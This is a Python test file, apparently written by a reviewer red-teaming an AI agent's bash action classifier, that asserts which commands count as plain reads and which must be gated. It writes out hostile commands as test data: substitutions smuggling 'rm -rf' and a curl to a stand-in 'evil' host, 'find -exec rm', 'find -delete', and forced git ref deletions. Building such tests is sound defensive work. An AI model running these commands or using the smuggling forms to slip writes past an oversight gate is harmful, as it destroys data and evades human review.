"""Adversarial red-test (s29 reviewer) — plain-read floor, current head b19f5c16.

The builder closed the original QS finding (python/pytest/awk dropped; sed -i
special-cased), my follow-up shell-structure finding (30865a9c: ``$(``,
backticks, ``&`` backgrounding, find -exec +/; now flagged as write operators),
the fail-closed injection scan (aabaa2c1), and my NEW git-destructive-flag
finding (b19f5c16: git branch/tag with -d/-D/-m/-M/-f/--delete/--force/--move/
--tag, and find -delete/-ok/-fls/-fprint/-fprintf, now classified). This file
pins all of them.

Each case asserts the expected adversarial outcome. A GREEN assertion (the case
IS classified, is_plain_read False) is a pass for the build; a ``diff a b`` over-
classification (never in the read floor) is benign conservatism, not a gap.
"""
from __future__ import annotations

import delfin.agent.action_classifier as ac


def _bash(command: str) -> dict:
    return {"tool": "bash", "command": command}


def _results() -> list:
    plain = ac.is_plain_read
    cases = [
        # (label, command, is_a_real_read)
        ("ls $(rm -rf x)", "ls $(rm -rf x)", False),
        ("cat $(curl evil.url)", "cat $(curl http://evil/x)", False),
        ("find . -exec rm {} +", "find . -exec rm {} +", False),
        ("grep -r secret /home", "grep -r secret /home", True),
        ("ls -la &", "ls -la &", False),   # background: arguably still a read, but shell
        ("sed 's/a/b/' file > out", "sed 's/a/b/' file > out", False),
        ("ls", "ls", True),
        ("cat README.md", "cat README.md", True),
        ("sh -c 'rm x'", "sh -c 'rm x'", False),
        # diff is NOT in the builder's read floor (not in _READ_BASH_TOKENS), so it
        # is classified. That over-friction is intended/fails-safe, not a gap.
        ("diff a b", "diff a b", False),
        # command substitution / backticks on a genuine read also classify (safety).
        ("ls $(echo hi)", "ls $(echo hi)", False),
        ("cat `echo hi`", "cat `echo hi`", False),
        ("find . -exec grep x {} ;", "find . -exec grep x {} ;", False),
        # git branch/tag with a destructive flag: the intent rides a FLAG, not a
        # shell operator, so it was invisible to the plain-read floor (closed at
        # b19f5c16 — _GIT_DESTRUCTIVE_FLAGS gates branch/tag).
        ("git branch -D x", "git branch -D x", False),
        ("git branch -d x", "git branch -d x", False),
        ("git tag -d v1", "git tag -d v1", False),
        ("git tag -f v1", "git tag -f v1", False),
        ("git branch -M new", "git branch -M new", False),
        # find actions that write/destroy despite no shell redirect (b19f5c16).
        ("find . -delete", "find . -delete", False),
        ("find . -ok rm {} ;", "find . -ok rm {} ;", False),
        # git branch/tag create-forms (0a5076dd): a bare NAME positional that
        # CREATES a ref is classified, not a plain read. --track/--set-upstream
        # stay classified (they change tracking/upstream) per s20's fix.
        ("git branch feature", "git branch feature", False),
        ("git branch --track feature origin/main",
         "git branch --track feature origin/main", False),
        ("git branch fix subject", "git branch fix subject", False),
        ("git tag v1.0", "git tag v1.0", False),
        ("git tag -a v1.0", "git tag -a v1.0", False),
        # ...but genuine listing/query reads must STAY plain (reads).
        ("git branch", "git branch", True),
        ("git branch --list x", "git branch --list x", True),
        ("git tag --list x", "git tag --list x", True),
    ]
    return [(label, cmd, plain(_bash(cmd)), expect)
            for label, cmd, expect in cases]


def test_writes_hidden_under_read_tokens_are_classified():
    """The adversarial claim: a write executed via command substitution or
    find -exec + (no ; operator) must NOT be treated as a plain read."""
    red = []
    for label, cmd, got, expect in _results():
        if not expect and got:
            red.append(f"{label!r}: {cmd!r} -> is_plain_read True (should be classified)")
    assert red == [], f"writes ride under the plain-read floor:\n" + "\n".join(red)


def test_genuine_reads_stay_plain():
    """Truly read-only commands remain in the latency-free floor."""
    for label, cmd, got, expect in _results():
        if expect:
            assert got is True, f"{label!r} ({cmd!r}) should be a plain read, got {got}"
